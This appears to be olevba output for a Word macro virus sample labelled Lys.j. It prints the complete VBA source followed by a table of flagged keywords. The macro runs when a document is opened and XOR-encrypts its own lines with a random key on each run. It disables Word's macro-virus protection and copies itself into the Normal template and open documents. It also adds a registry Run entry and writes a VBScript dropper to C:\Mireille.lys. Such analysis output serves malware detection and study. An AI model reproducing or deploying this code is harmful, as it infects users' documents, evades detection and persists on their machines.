olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lys.j-1995d571b209821606620371a7ee22c45148c2b4
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Lys.j-1995d571b209821606620371a7ee22c45148c2b4 
in file: Virus.MSWord.Lys.j-1995d571b209821606620371a7ee22c45148c2b4 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
END
Attribute VB_Name = "ThisDocument"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Open()
Application.ScreenUpdating = Int(Rnd * 0)
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
For V1 = 20 To 61
V2 = Null
V3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Asc((Mid(V3, 2, 1)))
V5 = V4 Xor 39
For V6 = 3 To Len(V3)
V7 = Asc(Mid(V3, V6, 1)) Xor V5
V2 = V2 & Chr(V7)
Next
V8 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, V8
Next
Call VM
End Sub
Private Sub VM()
For V1 = 20 To 61
V2 = Null
V3 = "'" & (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(V1, 1))
V4 = Int(Rnd() * 8) + 1
For V5 = 1 To Len(V3)
V6 = Asc(Mid(V3, V5, 1)) Xor V4
V2 = V2 & Chr(V6)
Next V5
V7 = V2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine V1, "'" & V7
Next V1
Options.ConfirmConversions = Int(Rnd * 0)
Options.SaveNormalPrompt = Int(Rnd * 0)
Options.VirusProtection = Int(Rnd * 0)
MV = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString MV
If ActiveDocument.ReadOnly = True Then
SetAttr ActiveDocument.FullName, vbNormal
ActiveDocument.Reload
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString MV
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
SetAttr ActiveDocument.FullName, vbReadOnly
ActiveDocument.Reload
Else
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString MV
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\.lys", "") = "VBSFile"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "") = "C:\Mireille.lys"
Open "C:\Mireille.lys" For Output As #1
Print #1, "Set wordobj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "Mireille = wscript.ScriptFullName"
Print #1, "Set NT = wordobj.NormalTemplate.VBProject.VBComponents.Item(1)"
Print #1, "NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines"
Print #1, "NT.CodeModule.AddFromFile Mireille"
Print #1, "NT.CodeModule.DeleteLines 1, 7"
Print #1, "wordobj.Quit"
Print #1, MV
Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

